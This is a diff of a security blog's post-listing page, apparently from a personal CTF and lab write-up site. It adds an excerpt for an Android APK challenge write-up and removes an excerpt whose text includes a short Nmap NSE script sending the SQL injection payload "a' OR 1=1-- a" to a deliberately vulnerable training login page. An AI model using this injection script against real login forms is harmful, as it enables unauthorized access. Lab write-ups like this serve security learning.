@@ -172,6 +172,24 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">WGMY2024 World II
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge Description Welp, time to do it again.
+Unable to install? That is a part of the challenge, try to overcome it.
+Author: Trailbl4z3r &amp; Monaruku
+hint: Tbh this is not a natively built app, more like something just wrapped into an app
+World-II.apk
+Solution Since it’s an APK file, Lets start with jadx-gui for static analysis. In terms of static analysis, it’s always best to check out AndroidManifest.xml first.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-12-29 13:40:56 +0800 +08'>December 29, 2024</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;915 words</footer>
+  <a class="entry-link" aria-label="post link to WGMY2024 World II" href="https://callmeks.github.io/posts/wgmy2024-world-ii/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">Android as Rubber Ducky
     </h2>
   </header>
@@ -183,21 +201,6 @@ Setting up Now that the android devices is rooted, I’ll need to download some 
   </div>
   <footer class="entry-footer"><span title='2024-12-04 16:25:45 +0800 +08'>December 4, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;290 words</footer>
   <a class="entry-link" aria-label="post link to Android as Rubber Ducky" href="https://callmeks.github.io/posts/android-as-rubber-ducky/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Bricks Login 5
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.
-Challenge Solution Login level 5 is just a simple SQL injection which will convert password into md5 hash. We could easily overcome it by injecting in username field.
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require &#34;http&#34; local shortport = require &#34;shortport&#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[&#39;username&#39;]=&#34;a&#39; OR 1=1-- a&#34; r[&#39;passwd&#39;]=&#34;test&#34; r[&#39;submit&#39;]=&#34;Submit&#34; resp = http.post(host,port,&#34;/login-5/index.php&#34;,nil,nil,r) final = string.match(resp.body, &#39;&lt;p&gt;.*alert%-box.-&gt;(.-)&lt;a.*&lt;/p&gt;&#39;) query = string.match(resp.body, &#34;.*SQL Query(.*)&lt;a.*&lt;/div&gt;&#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2024-12-03 16:23:41 +0800 +08'>December 3, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;244 words</footer>
-  <a class="entry-link" aria-label="post link to Bricks Login 5" href="https://callmeks.github.io/posts/bricks-login-5/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
